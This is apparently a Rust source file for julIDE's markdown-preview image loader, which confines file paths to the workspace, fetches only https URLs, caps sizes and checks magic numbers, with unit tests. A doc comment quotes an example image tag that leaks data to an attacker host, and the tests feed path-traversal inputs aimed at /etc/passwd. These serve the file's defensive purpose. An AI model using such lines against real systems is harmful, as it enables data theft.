//! Loading image bytes for the markdown preview, behind two opt-in settings.
//!
//! julIDE's markdown preview renders no images at all by default: the CSP allows
//! `img-src 'self' data: blob:`, so a remote `<img>` could only ever produce a broken
//! icon and a console violation, and nothing could read a local file either.
//!
//! Both escape hatches are served from here rather than by widening the CSP. Adding
//! `https:` to `img-src` would let *any* markup that reaches the webview beacon out —
//! `<img src="https://attacker/?leak=…">` needs no script to exfiltrate — and it would
//! do so for every feature sharing that realm, permanently, for users who never turned
//! anything on. Reading the bytes here and handing back a blob keeps the reach narrow
//! and keeps it attached to a setting. This is the same trade `marketplace` documents.
//!
//! ## What is checked, and where
//!
//! Every rule is enforced here, in Rust. The frontend does its own resolution and
//! refuses obviously bad hrefs first, but that is convenience, not a boundary — the
//! command is reachable over IPC by anything running in the webview. `plugin_protocol`
//! re-validates frontend-checked origins for the same reason.
//!
//! - The relevant setting must be on. Read per call, so revoking it takes effect at
//!   once rather than at the next restart.
//! - Local paths must resolve, after symlink resolution, inside the open workspace.
//! - Remote URLs must be `https:`, with no embedded credentials, and are fetched
//!   through the shared hardened client with a bounded redirect chain.
//! - The body is capped while streaming, and the declared content type must both be an
//!   image julIDE renders *and* agree with the bytes' own magic number.
//!
//! SVG is allowed and is the risky one, since an SVG document can carry script and
//! external references. Refusing it outright would drop README badges, which is most of
//! what anyone turns this on for, so instead it is handled specially at both ends:
//!
//! It is **not** enough that `<img>` renders SVG in the spec's secure static mode, where
//! script never runs. `URL.createObjectURL` produces a real, navigable URL, and a
//! document opened from `blob:` inherits its creator's origin — julIDE's own realm, the
//! one holding the IPC bridge. The preview cancels anchor clicks, but an `<img>` is not
//! an anchor: the webview's own "open image in new tab" context menu is outside that
//! handler. So the frontend runs every SVG through DOMPurify's SVG profile and hands it
//! back as a `data:` URL rather than a blob — `data:` gets an opaque origin and cannot
//! be navigated to at top level. Rasters stay on `blob:`.
//!
//! AVIF and HEIC are deliberately absent from the allowlist. They reach system codecs
//! with a poor CVE record, and no README needs them. WebP is included despite
//! CVE-2023-4863 because it is genuinely common; that is a considered trade, not an
//! oversight.

use crate::http::{assert_https, is_plausibly_public, read_capped, HTTP};
use serde::Serialize;
use std::path::{Component, Path, PathBuf};
use std::time::Duration;

const MAX_IMAGE_BYTES: usize = 8 * 1024 * 1024;
/// SVG gets its own, much smaller cap.
///
/// Raster bytes go to a decoder; SVG bytes go through DOMPurify and then an XML parser
/// on the main thread. 4 MiB of nested `<g>` is a frozen UI, not a slow decode.
const MAX_SVG_BYTES: usize = 512 * 1024;
const IMAGE_TIMEOUT: Duration = Duration::from_secs(10);

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImagePayload {
    /// The media type the frontend should give the blob.
    pub mime: String,
    /// Base64, matching how julIDE already moves image bytes over IPC (see `julia::MIME_HELPER`).
    pub data: String,
}

/// Media types julIDE will render, paired with the magic number that must back them up.
///
/// A server's `Content-Type` is a claim, not a fact. Sniffing stops a text/html error
/// page or an executable from being handed to the webview labelled as a PNG.
const ALLOWED: &[(&str, &[&[u8]])] = &[
    ("image/png", &[b"\x89PNG\r\n\x1a\n"]),
    ("image/jpeg", &[b"\xff\xd8\xff"]),
    ("image/gif", &[b"GIF87a", b"GIF89a"]),
    // RIFF....WEBP — the size field sits between, so the tail is checked separately.
    ("image/webp", &[b"RIFF"]),
    ("image/svg+xml", &[]),
];

/// Normalise `image/png; charset=utf-8` to `image/png`.
fn base_mime(raw: &str) -> String {
    raw.split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase()
}

fn mime_for_extension(path: &Path) -> Option<&'static str> {
    let ext = path.extension()?.to_str()?.to_ascii_lowercase();
    Some(match ext.as_str() {
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "svg" => "image/svg+xml",
        _ => return None,
    })
}

/// Does the payload actually look like what it claims to be?
///
/// SVG is exempt from magic-number matching because XML has no fixed prefix, so it gets
/// a structural check instead: skip a BOM, whitespace, an XML declaration, comments and
/// a DOCTYPE, then require that the *first element* is `<svg`. Merely searching for
/// "<svg" anywhere would accept an HTML login page that mentions one — and a captive
/// portal or a 200-with-an-error-page is exactly what a badge URL returns in practice.
fn sniff_agrees(mime: &str, bytes: &[u8]) -> bool {
    let Some((_, magics)) = ALLOWED.iter().find(|(m, _)| *m == mime) else {
        return false;
    };
    if mime == "image/svg+xml" {
        return looks_like_svg(bytes);
    }
    if mime == "image/webp" {
        // RIFF alone is also WAV and AVI; the brand sits at bytes 8..12.
        return bytes.len() > 12 && &bytes[0..4] == b"RIFF" && &bytes[8..12] == b"WEBP";
    }
    magics.iter().any(|m| bytes.starts_with(m))
}

/// Is the first element of this document an `<svg>`?
fn looks_like_svg(bytes: &[u8]) -> bool {
    let head = &bytes[..bytes.len().min(4096)];
    let text = String::from_utf8_lossy(head);
    let mut rest = text.trim_start_matches('\u{feff}').trim_start();

    loop {
        if let Some(tail) = rest.strip_prefix("<?") {
            // XML declaration or processing instruction.
            let Some(end) = tail.find("?>") else {
                return false;
            };
            rest = tail[end + 2..].trim_start();
        } else if let Some(tail) = rest.strip_prefix("<!--") {
            let Some(end) = tail.find("-->") else {
                return false;
            };
            rest = tail[end + 3..].trim_start();
        } else if rest.len() >= 9 && rest[..9].eq_ignore_ascii_case("<!doctype") {
            let Some(end) = rest.find('>') else {
                return false;
            };
            rest = rest[end + 1..].trim_start();
        } else {
            break;
        }
    }

    // The first real tag has to be svg — `<svg>`, `<svg `, `<svg\n`, `<svg/>`.
    let Some(tail) = rest.strip_prefix('<') else {
        return false;
    };
    if !tail.get(..3).is_some_and(|n| n.eq_ignore_ascii_case("svg")) {
        return false;
    }
    match tail.as_bytes().get(3) {
        // Truncated at exactly "<svg" by the 4 KiB sniff window.
        None => true,
        Some(c) => c.is_ascii_whitespace() || *c == b'>' || *c == b'/',
    }
}

/// Resolve an image path and refuse anything that escapes the workspace root.
///
/// Accepts both an absolute path and one relative to the root. Absolute is the normal
/// case: `classifyMarkdownHref` (src/markdown/links.ts:107) already resolves the href
/// against the document's directory before it gets here. That resolution is *textual*
/// and says so — which is exactly why this function does not trust it.
///
/// `canonicalize` on both sides, so a symlink pointing out of the workspace is caught
/// too. A lexical check alone would accept `assets/link-to-home/.ssh/id_rsa.png`.
fn resolve_in_workspace(workspace: &str, raw: &str) -> Result<PathBuf, String> {
    let root = Path::new(workspace)
        .canonicalize()
        .map_err(|e| format!("workspace is unreadable: {e}"))?;

    let candidate = Path::new(raw);
    // Reject an obvious traversal before touching the filesystem, so the error is about
    // intent rather than about a missing file. Only meaningful for relative paths; an
    // absolute one is judged entirely by the `starts_with` check below.
    if !candidate.is_absolute()
        && candidate
            .components()
            .any(|c| matches!(c, Component::ParentDir | Component::Prefix(_)))
    {
        return Err("refusing an image path that leaves the workspace".into());
    }

    let joined = if candidate.is_absolute() {
        candidate.to_path_buf()
    } else {
        root.join(candidate)
    };
    let resolved = joined
        .canonicalize()
        .map_err(|_| format!("image not found in the workspace: {raw}"))?;
    if !resolved.starts_with(&root) {
        return Err("refusing an image path that leaves the workspace".into());
    }
    if !resolved.is_file() {
        return Err(format!("not a file: {raw}"));
    }
    Ok(resolved)
}

fn encode(mime: &str, bytes: &[u8]) -> Result<ImagePayload, String> {
    use base64::Engine;
    if !sniff_agrees(mime, bytes) {
        return Err(format!(
            "the bytes do not look like {mime}; refusing to render them"
        ));
    }
    if mime == "image/svg+xml" && bytes.len() > MAX_SVG_BYTES {
        return Err(format!(
            "the SVG is larger than the {MAX_SVG_BYTES} byte limit"
        ));
    }
    Ok(ImagePayload {
        mime: mime.to_string(),
        data: base64::engine::general_purpose::STANDARD.encode(bytes),
    })
}

/// Read a confined, size-checked file. Runs on the blocking pool.
fn read_local(path: &Path) -> Result<ImagePayload, String> {
    let mime = mime_for_extension(path)
        .ok_or_else(|| format!("not an image julIDE renders: {}", path.display()))?;

    let meta = std::fs::metadata(path).map_err(|e| e.to_string())?;
    // Checked before reading, and again by the type-specific cap in `encode`.
    if meta.len() > MAX_IMAGE_BYTES as u64 {
        return Err(format!(
            "the image is larger than the {MAX_IMAGE_BYTES} byte limit"
        ));
    }
    let bytes = std::fs::read(path).map_err(|e| e.to_string())?;
    encode(mime, &bytes)
}

/// Read one image for the markdown preview.
///
/// `href` is either a workspace-relative path or an `https:` URL; which one decides
/// which setting has to be on.
#[tauri::command]
pub async fn image_load(
    href: String,
    workspace_path: Option<String>,
) -> Result<ImagePayload, String> {
    let settings = crate::settings::settings_load();
    let is_remote = href.starts_with("http://") || href.starts_with("https://");

    if is_remote {
        if !settings.allow_remote_images {
            return Err("Remote images are turned off. Settings → Appearance.".into());
        }
        let parsed = assert_https(&href)?;
        if !is_plausibly_public(&parsed) {
            return Err("refusing an image URL that points at a private or local address".into());
        }
        let response = HTTP
            .get(&href)
            .timeout(IMAGE_TIMEOUT)
            .send()
            .await
            .map_err(|e| format!("could not fetch the image: {e}"))?;

        // Taken before the body is consumed; the server's claim still has to survive
        // the magic-number check in `encode`.
        let declared = response
            .headers()
            .get(reqwest::header::CONTENT_TYPE)
            .and_then(|v| v.to_str().ok())
            .map(base_mime)
            .unwrap_or_default();
        if !ALLOWED.iter().any(|(m, _)| *m == declared) {
            return Err(format!("not an image julIDE renders: {declared:?}"));
        }

        let bytes = read_capped(response, MAX_IMAGE_BYTES, "the image", None).await?;
        return encode(&declared, &bytes);
    }

    if !settings.allow_local_images {
        return Err("Workspace images are turned off. Settings → Appearance.".into());
    }
    let workspace = workspace_path.ok_or("no workspace is open")?;

    // Off the main thread: an 8 MiB read plus base64 on the UI thread is a visible
    // stall, and a README can reference a dozen images at once.
    tauri::async_runtime::spawn_blocking(move || {
        let path = resolve_in_workspace(&workspace, &href)?;
        read_local(&path)
    })
    .await
    .map_err(|e| format!("reading the image failed: {e}"))?
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base_mime_drops_parameters() {
        assert_eq!(base_mime("image/PNG; charset=utf-8"), "image/png");
        assert_eq!(base_mime("  image/svg+xml  "), "image/svg+xml");
    }

    #[test]
    fn sniff_rejects_a_lie() {
        // An HTML error page served as image/png is the common case and the one that
        // matters: it must not reach the webview wearing an image label.
        assert!(!sniff_agrees("image/png", b"<!doctype html><html>"));
        assert!(sniff_agrees("image/png", b"\x89PNG\r\n\x1a\n\x00\x00"));
        assert!(sniff_agrees("image/jpeg", b"\xff\xd8\xff\xe0"));
        assert!(sniff_agrees("image/gif", b"GIF89a...."));
    }

    #[test]
    fn sniff_rejects_types_outside_the_allowlist() {
        assert!(!sniff_agrees("image/x-icon", b"\x00\x00\x01\x00"));
        assert!(!sniff_agrees("text/html", b"<html>"));
        assert!(!sniff_agrees(
            "application/octet-stream",
            b"\x89PNG\r\n\x1a\n"
        ));
    }

    #[test]
    fn webp_needs_both_halves_of_the_header() {
        assert!(sniff_agrees("image/webp", b"RIFF\x00\x00\x00\x00WEBPVP8 "));
        // RIFF alone is also WAV and AVI.
        assert!(!sniff_agrees("image/webp", b"RIFF\x00\x00\x00\x00WAVEfmt "));
    }

    #[test]
    fn svg_wants_svg_as_the_first_element() {
        assert!(sniff_agrees("image/svg+xml", b"<svg xmlns=\"...\"></svg>"));
        assert!(sniff_agrees("image/svg+xml", b"<SVG/>"));
        assert!(sniff_agrees(
            "image/svg+xml",
            b"<?xml version=\"1.0\"?><svg/>"
        ));
        assert!(sniff_agrees(
            "image/svg+xml",
            b"\xef\xbb\xbf<?xml version=\"1.0\"?>\n<!-- a note -->\n<!DOCTYPE svg PUBLIC \"x\" \"y\">\n<svg>"
        ));
        assert!(!sniff_agrees("image/svg+xml", b"just some text"));
    }

    #[test]
    fn svg_sniff_refuses_html_that_merely_mentions_svg() {
        // The realistic failure: a login page or captive portal answering a badge URL
        // with HTTP 200. Searching for "<svg" anywhere would accept all of these.
        for html in [
            &b"<!DOCTYPE html><html><body><svg></svg></body></html>"[..],
            &b"<html><p>see the <svg> element</p></html>"[..],
            &b"<?xml version=\"1.0\"?><html><svg/></html>"[..],
        ] {
            assert!(!sniff_agrees("image/svg+xml", html), "accepted: {html:?}");
        }
    }

    #[test]
    fn avif_and_heic_are_not_renderable() {
        // Deliberate exclusions — they reach system codecs with a poor CVE record.
        // Removing one of these asserts should be a visible diff, not a silent widening.
        assert!(!ALLOWED.iter().any(|(m, _)| *m == "image/avif"));
        assert!(!ALLOWED.iter().any(|(m, _)| *m == "image/heic"));
        assert_eq!(mime_for_extension(Path::new("a.avif")), None);
        assert_eq!(mime_for_extension(Path::new("a.heic")), None);
    }

    #[test]
    fn oversized_svg_is_refused_even_though_the_bytes_are_valid() {
        let big = format!("<svg>{}</svg>", "<g></g>".repeat(MAX_SVG_BYTES / 4));
        assert!(big.len() > MAX_SVG_BYTES);
        assert!(encode("image/svg+xml", big.as_bytes()).is_err());
        // A small one still goes through.
        assert!(encode("image/svg+xml", b"<svg/>").is_ok());
    }

    #[test]
    fn extension_mapping_is_case_insensitive() {
        assert_eq!(mime_for_extension(Path::new("a/b.PNG")), Some("image/png"));
        assert_eq!(
            mime_for_extension(Path::new("a/b.jpeg")),
            Some("image/jpeg")
        );
        assert_eq!(mime_for_extension(Path::new("a/b.txt")), None);
        assert_eq!(mime_for_extension(Path::new("a/b")), None);
    }

    #[test]
    fn workspace_confinement_refuses_traversal_and_absolutes() {
        let dir = std::env::temp_dir().join("julide-image-confinement-test");
        let _ = std::fs::create_dir_all(dir.join("assets"));
        std::fs::write(dir.join("assets/ok.png"), b"\x89PNG\r\n\x1a\n").unwrap();
        let ws = dir.to_str().unwrap();

        assert!(resolve_in_workspace(ws, "assets/ok.png").is_ok());
        // The normal case: links.ts hands over an already-resolved absolute path.
        assert!(resolve_in_workspace(ws, dir.join("assets/ok.png").to_str().unwrap()).is_ok());

        assert!(resolve_in_workspace(ws, "../../../etc/passwd").is_err());
        assert!(resolve_in_workspace(ws, "assets/../../etc/passwd").is_err());
        assert!(resolve_in_workspace(ws, "/etc/passwd").is_err());
        assert!(resolve_in_workspace(ws, "assets/missing.png").is_err());
        // A directory is not an image.
        assert!(resolve_in_workspace(ws, "assets").is_err());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn workspace_confinement_refuses_a_symlink_leading_out() {
        // The case a textual check cannot catch, and the reason both ends are
        // canonicalized rather than string-compared.
        let dir = std::env::temp_dir().join("julide-image-symlink-test");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let outside = std::env::temp_dir().join("julide-image-symlink-target.png");
        std::fs::write(&outside, b"\x89PNG\r\n\x1a\n").unwrap();
        std::os::unix::fs::symlink(&outside, dir.join("escape.png")).unwrap();

        let err = resolve_in_workspace(dir.to_str().unwrap(), "escape.png").unwrap_err();
        assert!(err.contains("leaves the workspace"), "got: {err}");

        let _ = std::fs::remove_dir_all(&dir);
        let _ = std::fs::remove_file(&outside);
    }
}
